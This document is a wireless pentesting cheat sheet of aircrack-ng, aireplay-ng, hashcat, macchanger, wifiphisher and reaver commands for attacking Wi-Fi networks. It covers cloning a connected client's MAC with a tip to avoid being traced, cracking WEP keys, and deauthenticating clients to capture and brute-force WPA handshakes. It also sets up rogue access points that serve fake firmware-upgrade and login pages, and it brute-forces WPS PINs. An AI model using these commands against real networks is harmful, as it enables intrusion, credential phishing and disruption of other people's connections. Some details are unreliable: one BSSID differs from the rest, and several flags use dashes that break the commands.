#Basic Wireless Pentesting for Wifi, IEEE Std 802.11-2016
#Frame type : Management, Control, Data, Extension
#Security methods: WEP, WPA(TKIP), WPA2(CCMP), WPA3(SAE)， IEEE 802.1X Authentication(RADIUS)

Step： 
ifconfig wlan0 down
iwconfig wlan0 mode monitor
iw dev | grep type         #to confirm the devcie is in 'type monitor'
ifconfig wlan0 up
airmon-ng start wlan0
airodump-ng -w  packet.record wlan0
#Use Wireshark to capture the packet with *.pcap but will miss hide ssid packet.
#In this case you can send probe_request frame to get it.(such as tool scapy)

#forge a MAC to your, Assume the AP's MAC is 02:00:02:03:04:06
airodump-ng --bssid 02:00:02:03:04:06 -w fakeclient.record wlan0
#Anylasis the record file and you can see which client connect to this AP. Assume 00:02:03:04:05:06

ifconfig wlan0 down
macchanger -m 00:02:03:04:05:06 wlan0 
#This will use fake MAC but real existed instead your.
#Be careful to use macchanger to change MAC permanent to avoid traceback trouble.
ifconfig wlan0 up
#you can do more work in this case to see what happens, maybe modify the wpa_supplicant code.

#This will crack the WEP key.
airodump-ng --bssid 02:00:02:03:04:06 -w weppacket.record wlan0
aircrack-ng -b 02:00:02:03:04:05 weppacket.record
#You will get the WEP key normaly, else  capture more packet to analysis

#This will crack the WPA pre-share key
Method one:
Download https://github.com/FluxionNetwork/fluxion.git 
Attack detail is  here: https://github.com/FluxionNetwork/fluxion/wiki/Captive-Portal-Attack

Method two:
#Use hashcat tool to Brute-Force and Dictionary attack to get the key.   https://github.com/hashcat/hashcat.git
#Before use hash cat, please convert wpapacket.record.cap file to hccapx format wpapacket.record.hccapx.
#Reference https://github.com/hashcat/hashcat-utils to convert file.

airodump-ng --bssid 02:00:02:03:04:06 -w wpapacket.record wlan0 (run background)
aireplay-ng --deauth 100 -a 02:00:02:03:04:06 -c 00:02:03:04:05:06 wlan0
hashcat -m 2500 -a0 wpapacket.record.hccapx /tmp/wordlists.txt   #2500--WPA-EAPOL-PBKDF2, wordlists.txt is example.dict from hashcat site.
hashcat -m 2500 -a3 wpapacket.record.hccapx  # -a 0  Dictionary attack, -a 3 Brute-Force attack.
#hashcat -m 2501 -a 0 wpapacket.record.hccapx 
#hashcat -m 16800  -a 0 wpapacket.record.hccapx

#Rogue AP Attack
Tools: https://github.com/wifiphisher/wifiphisher.git #Please see the site wiki to get more detail.
wifiphisher -aI wlan0 -p firmware-upgrade --handshake-capture handshake.pcap
wifiphisher -nJ -e 'Free WiFi' -p oauth-login
wifiphisher -nJ -e 'Guest Wifi' -p plugin-update

#WPS discovery and Attack
iwconfig wlan0 mode monitor
wash –I wlan0 –C
airmon-ng start wlan0
airodump-ng wlan0 #make sure the related bssid support WPA/WPA2 PSK and WPS such as 02:00:02:03:04:06 
reaver –i wlan0 –b 02:00:02:03:04:06 –c 11  –vv #-c 11 mean channel 11


#Attack the wifi route used OpenWrt
0. CVE-2019-12272 
1. CVE-2018-11116
2. CVE-2018-10123
3. CVE-2017-13772

#TBD WPA3 SAE Attack and man-in-the-middle attack



